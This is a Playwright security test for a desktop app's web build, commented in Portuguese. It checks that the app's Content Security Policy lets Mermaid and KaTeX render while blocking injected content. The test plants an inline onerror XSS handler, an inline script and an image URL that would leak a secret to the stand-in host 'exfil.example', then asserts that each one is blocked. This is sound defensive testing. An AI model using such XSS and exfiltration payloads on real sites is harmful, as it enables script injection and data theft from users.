import { test, expect, type Page } from "@playwright/test";
import { createServer, type Server } from "node:http";
import { existsSync, readFileSync } from "node:fs";
import { extname, join, normalize, resolve } from "node:path";
import { addRepo } from "./helpers";

// Segurança: o build (dist) roda sob a MESMA CSP do app desktop (tauri.conf.json). O que o app usa
// (Mermaid, KaTeX, avatares) funciona; script injetado e imagem de fora (vazamento por URL) são barrados.
const DIST = resolve(process.cwd(), "dist");
const conf = JSON.parse(readFileSync(resolve(process.cwd(), "../desktop/src-tauri/tauri.conf.json"), "utf8"));
const CSP = Object.entries(conf.app.security.csp as Record<string, string>).map(([k, v]) => `${k} ${v}`).join("; ");
const MIME: Record<string, string> = { ".html": "text/html", ".js": "text/javascript", ".css": "text/css", ".svg": "image/svg+xml", ".png": "image/png", ".woff2": "font/woff2", ".woff": "font/woff", ".ttf": "font/ttf", ".json": "application/json", ".webmanifest": "application/manifest+json" };

let srv: Server;
let base = "";
test.beforeAll(async () => {
  test.skip(!existsSync(join(DIST, "index.html")), "rode `npm run build` antes");
  srv = createServer((req, res) => {
    const url = new URL(req.url ?? "/", "http://x");
    let file = normalize(join(DIST, decodeURIComponent(url.pathname)));
    if (!file.startsWith(DIST) || !existsSync(file) || !extname(file)) file = join(DIST, "index.html");
    res.setHeader("content-security-policy", CSP);
    res.setHeader("content-type", MIME[extname(file)] ?? "application/octet-stream");
    res.end(readFileSync(file));
  });
  await new Promise<void>((ok) => srv.listen(0, "127.0.0.1", () => ok()));
  base = `http://127.0.0.1:${(srv.address() as { port: number }).port}`;
});
test.afterAll(() => srv?.close());

async function violations(page: Page) {
  await page.addInitScript(() => {
    (window as any).__csp = [];
    document.addEventListener("securitypolicyviolation", (e) => (window as any).__csp.push(`${e.violatedDirective} ${e.blockedURI}`));
  });
  return () => page.evaluate(() => (window as any).__csp as string[]);
}

test("CSP do desktop: o app funciona e injeção é barrada", async ({ page }) => {
  const got = await violations(page);
  await page.goto(`${base}/?mock`);
  await page.getByTestId("create-ws").click();
  await addRepo(page, "/mock/repos/demo");
  await page.getByTestId("create-go").click();
  const chat = page.locator(".ws-host:not([hidden]) .center-body:not([hidden])");
  await chat.getByTestId("composer").fill("faça um diagrama");
  await chat.getByTestId("composer").press("Enter");
  await expect(chat.getByTestId("mermaid").locator("svg").first()).toBeVisible({ timeout: 20_000 });
  await expect(chat.getByTestId("katex").locator(".katex")).toBeVisible();
  expect(await got(), "nada legítimo barrado").toEqual([]);

  // Ataque: HTML com handler inline (XSS) e imagem que vazaria dados pela URL.
  await page.evaluate(() => {
    document.body.insertAdjacentHTML("beforeend", `<img id="xss" src="data:," onerror="window.__pwn=1">`);
    const img = document.createElement("img");
    img.src = "https://exfil.example/x.png?segredo=1";
    document.body.appendChild(img);
    const s = document.createElement("script");
    s.textContent = "window.__pwn2 = 1";
    document.body.appendChild(s);
  });
  await expect.poll(async () => (await got()).length).toBeGreaterThanOrEqual(2);
  expect(await page.evaluate(() => [(window as any).__pwn, (window as any).__pwn2])).toEqual([undefined, undefined]);
  const v = (await got()).join("\n");
  expect(v).toContain("exfil.example");
  expect(v).toMatch(/script-src/);
});
